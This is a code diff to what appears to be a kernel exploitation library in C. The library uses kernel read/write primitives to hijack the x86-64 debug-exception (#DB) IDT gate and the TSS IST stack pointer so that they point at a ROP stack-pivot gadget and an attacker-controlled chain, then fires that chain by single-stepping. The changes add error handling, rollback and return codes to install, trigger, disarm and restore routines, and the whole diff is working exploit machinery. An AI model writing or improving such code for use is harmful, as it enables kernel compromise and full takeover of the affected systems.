@@ -33,11 +33,19 @@ static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist, uint8_t type, u
 
 static int probe_write(khook_t *kh, uint64_t addr)
 {
-  uint64_t save = kread_q(kh, addr);
+  uint64_t save;
+  uint64_t readback;
+  if (kh->read(addr, &save, 8) != 0)
+    return 0;
   uint64_t test = save ^ 0xA5A5A5A5A5A5A5A5ULL;
-  kwrite_q(kh, addr, test);
-  uint64_t readback = kread_q(kh, addr);
-  kwrite_q(kh, addr, save);
+  if (kwrite_q(kh, addr, test) != 0)
+    return 0;
+  if (kh->read(addr, &readback, 8) != 0) {
+    kwrite_q(kh, addr, save);
+    return 0;
+  }
+  if (kwrite_q(kh, addr, save) != 0)
+    return 0;
   return readback == test;
 }
 
@@ -313,9 +321,10 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   db_gate = kh->idt_base + 16 * KH_VEC_DB;
   ist = ist_slot_va(kh);
 
-  kh->saved_gate_lo = kread_q(kh, db_gate);
-  kh->saved_gate_hi = kread_q(kh, db_gate + 8);
-  kh->saved_ist     = kread_q(kh, ist);
+  if (kh->read(db_gate, &kh->saved_gate_lo, 8) != 0 ||
+      kh->read(db_gate + 8, &kh->saved_gate_hi, 8) != 0 ||
+      kh->read(ist, &kh->saved_ist, 8) != 0)
+    return -4;
   kh->kcs           = (uint16_t)(kh->saved_gate_lo >> 16);
   if (!kh->kcs)
     return -4;
@@ -333,8 +342,12 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   }
 
   // Check if TSS RSP is valid-looking
-  if ((kread_q(kh, kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + 0x04) >> 47) != 0x1FFFFULL)
-    return -15;
+  {
+    uint64_t rsp0;
+    if (kh->read(kh->tss_base + (uint64_t)kh->core_id * kh->tss_stride + 0x04,
+                 &rsp0, 8) != 0 || (rsp0 >> 47) != 0x1FFFFULL)
+      return -15;
+  }
 
   scratch    = kh->scratch_base;
   arm_chain  = scratch + KH_OFF_CHAIN_ARM;
@@ -438,39 +451,50 @@ int kh_install(khook_t *kh, const kh_chain_t *handler)
   if (kh->write(scratch, img, sizeof img) != 0)
     return -7;
 
-  if (kwrite_q(kh, ist, arm_chain) != 0)
+  if (kwrite_q(kh, ist, arm_chain) != 0) {
+    kwrite_q(kh, ist, kh->saved_ist);
     return -8;
+  }
 
   gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kh->kcs, kh->ist_index,
               KH_GATE_INTERRUPT, 0, 1, &lo, &hi);
-  if (kwrite_q(kh, db_gate + 8, hi) != 0)
+  if (kwrite_q(kh, db_gate + 8, hi) != 0) {
+    kwrite_q(kh, ist, kh->saved_ist);
     return -9;
-  if (kwrite_q(kh, db_gate, lo) != 0)
+  }
+  if (kwrite_q(kh, db_gate, lo) != 0) {
+    kwrite_q(kh, db_gate + 8, kh->saved_gate_hi);
+    kwrite_q(kh, ist, kh->saved_ist);
     return -10;
+  }
 
-  if (kread_q(kh, ist) != arm_chain)
-    return -13;
-  if (kread_q(kh, db_gate) != lo || kread_q(kh, db_gate + 8) != hi)
+  if (kread_q(kh, ist) != arm_chain ||
+      kread_q(kh, db_gate) != lo || kread_q(kh, db_gate + 8) != hi) {
+    kwrite_q(kh, db_gate + 8, kh->saved_gate_hi);
+    kwrite_q(kh, db_gate, kh->saved_gate_lo);
+    kwrite_q(kh, ist, kh->saved_ist);
     return -12;
+  }
 
   kh->installed = 1;
   return 0;
 }
 
-void kh_trigger(khook_t *kh)
+int kh_trigger(khook_t *kh)
 {
   uint64_t resume_rsp, rbp_val;
   void *resume_label = &&resumed;
 
   if (!kh || !kh->installed)
-    return;
+    return -1;
 
   __asm__ volatile("mov %%rsp, %0" : "=r"(resume_rsp));
   __asm__ volatile("mov %%rbp, %0" : "=r"(rbp_val));
 
-  kwrite_q(kh, kh->scratch_base + KH_OFF_RESUME + KH_RC_RBP, rbp_val);
-  kwrite_q(kh, kh->arm_rip_slot, (uint64_t)resume_label);
-  kwrite_q(kh, kh->arm_rsp_slot, resume_rsp);
+  if (kwrite_q(kh, kh->scratch_base + KH_OFF_RESUME + KH_RC_RBP, rbp_val) != 0 ||
+      kwrite_q(kh, kh->arm_rip_slot, (uint64_t)resume_label) != 0 ||
+      kwrite_q(kh, kh->arm_rsp_slot, resume_rsp) != 0)
+    return -2;
 
   __asm__ volatile(
       "pushfq             \n\t"
@@ -479,7 +503,7 @@ void kh_trigger(khook_t *kh)
       "nop                \n\t"   // single-step #DB
       ::: "memory", "cc");
 resumed:
-  return;
+  return 0;
 }
 
 int kh_disarm(khook_t *kh)
@@ -515,8 +539,7 @@ int kh_disarm(khook_t *kh)
   if (kwrite_q(kh, ist, scratch + KH_OFF_CHAIN_ARM) != 0)
     return -3;
 
-  kh_trigger(kh);
-  return 0;
+  return kh_trigger(kh);
 }
 
 int kh_restore(khook_t *kh)
@@ -529,9 +552,17 @@ int kh_restore(khook_t *kh)
   db_gate = kh->idt_base + 16 * KH_VEC_DB;
   ist = ist_slot_va(kh);
 
-  kwrite_q(kh, db_gate + 8, kh->saved_gate_hi);
-  kwrite_q(kh, db_gate, kh->saved_gate_lo);
-  kwrite_q(kh, ist, kh->saved_ist);
+  if (kwrite_q(kh, db_gate + 8, kh->saved_gate_hi) != 0 ||
+      kwrite_q(kh, db_gate, kh->saved_gate_lo) != 0 ||
+      kwrite_q(kh, ist, kh->saved_ist) != 0)
+    return -2;
+  uint64_t gate_hi, gate_lo, ist_value;
+  if (kh->read(db_gate + 8, &gate_hi, 8) != 0 ||
+      kh->read(db_gate, &gate_lo, 8) != 0 ||
+      kh->read(ist, &ist_value, 8) != 0 ||
+      gate_hi != kh->saved_gate_hi ||
+      gate_lo != kh->saved_gate_lo || ist_value != kh->saved_ist)
+    return -3;
   kh->installed = 0;
   return 0;
 }
